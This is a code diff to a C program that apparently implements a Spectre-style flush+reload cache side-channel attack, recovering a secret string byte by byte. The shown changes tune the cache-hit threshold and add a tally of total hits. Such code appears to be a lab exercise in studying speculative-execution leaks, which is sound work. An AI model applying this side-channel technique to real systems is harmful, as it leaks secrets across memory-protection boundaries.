@@ -15,7 +15,7 @@
 #include <string.h>
 #include <stdint.h>
 
-#define CACHE_HIT_THRESHOLD (80)
+#define CACHE_HIT_THRESHOLD (100)
 #define DELTA 1024
 
 unsigned int buffer_size = 10;
@@ -99,7 +99,7 @@ void reloadSideChannel(int scores[]) {
 
 int main() {
     size_t larger_x = (size_t)(secret - (char*)buffer);
-    int i, j=0, max;
+    int i, j=0, max, tot_hits = 0;
     int len = (int)strlen(secret);                          // calculates number of chars in the secret
     int scores[256];                                        // array to hold ascii value hit totals
     char *sourced_secret = malloc(len * sizeof(uint8_t));   // create a dynamic char array of the secret
@@ -135,10 +135,12 @@ int main() {
         // Store the secret value as an array for later output
         char c = (char) max;    // convert the ascii value to its corresponding char
         sourced_secret[j] = c;  // add char to the results array
+        tot_hits = tot_hits + scores[max];
         larger_x++;             // increment to the next memory location of secret
         j++;                    // increment to the next element in sourced_secret array
     }
 
     printf("\nThe secret is => %s\n", sourced_secret);
+    printf("\nTotal hits for the solution: %d\n", tot_hits);
     return (0);
 }
